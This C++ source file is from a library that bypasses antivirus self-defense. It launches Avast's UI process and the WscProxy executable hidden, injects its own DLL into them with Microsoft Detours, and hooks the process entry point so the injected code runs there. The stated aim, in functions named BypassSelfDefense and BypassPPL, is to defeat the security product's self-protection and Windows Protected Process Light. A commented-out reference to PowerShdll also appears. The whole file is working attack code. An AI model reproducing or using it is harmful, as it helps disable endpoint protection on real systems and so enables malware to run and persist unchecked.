// SelfDefenseBypass.cpp : Defines the functions for the static library.
//

#include <Windows.h>
#include "SelfDefenseBypass.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <string>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

namespace
{
    void CreateProcessWithSelf(std::wstring_view exeFilePath)
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(CreateProcessWithSelf, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto exePath = fs::path(exeFilePath);
        const auto exeParentDirectoryPath = exePath.parent_path();

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        /*auto thisModuleParentDirectoryPath = thisModulePath.parent_path();
        const auto powerShdllPath = std::move(thisModuleParentDirectoryPath) / "PowerShdll.dll";*/

        const auto thisModulePathString = thisModulePath.string();
        //const auto powerShdllPathString = powerShdllPath.string();

        const char *injectedDlls[] = { thisModulePathString.c_str()/*, powerShdllPathString.c_str()*/ };

        STARTUPINFO startupInfo = {};
        startupInfo.wShowWindow = SW_HIDE;
        startupInfo.cb = sizeof(startupInfo);

        wil::unique_process_information processInfo;

        if (!DetourCreateProcessWithDlls(
            nullptr,
            const_cast<LPWSTR>(exePath.c_str()),
            nullptr,
            nullptr,
            FALSE,
            0,
            nullptr,
            exeParentDirectoryPath.c_str(),
            &startupInfo,
            &processInfo,
            _countof(injectedDlls),
            injectedDlls,
            &::CreateProcessW))
            throw std::runtime_error("DetourCreateProcessWithDlls failed. Error: " + std::to_string(::GetLastError()));
    }
} // anonymous namespace

void BypassSelfDefense()
{
    CreateProcessWithSelf(AvastUiExeFilePath);
}

void BypassPPL()
{
    CreateProcessWithSelf(WscProxyExeFilePath);
}

bool DelayedExecute(EntryPointType detourEntryPoint, EntryPointType *originalEntryPoint)
{
    *originalEntryPoint = reinterpret_cast<EntryPointType>(DetourGetEntryPoint(NULL));
    if (!*originalEntryPoint)
    {
        std::cerr << "DetourGetEntryPoint failed: error " << ::GetLastError();
        return false;
    }

    auto returnValue = DetourTransactionBegin();
    if (returnValue != NO_ERROR)
    {
        std::cerr << "DetourTransactionBegin failed. Error " << returnValue;
        return false;
    }

    returnValue = DetourUpdateThread(::GetCurrentThread());
    if (returnValue != NO_ERROR)
    {
        std::cerr << "DetourUpdateThread failed. Error " << returnValue;
        return false;
    }

    returnValue = DetourAttach(&reinterpret_cast<PVOID &>(*originalEntryPoint), detourEntryPoint);
    if (returnValue != NO_ERROR)
    {
        std::cerr << "DetourAttach failed. Error " << returnValue;
        return false;
    }

    returnValue = DetourTransactionCommit();
    if (returnValue != NO_ERROR)
    {
        std::cerr << "DetourTransactionCommit failed. Error " << returnValue;
        return false;
    }

    return true;
}
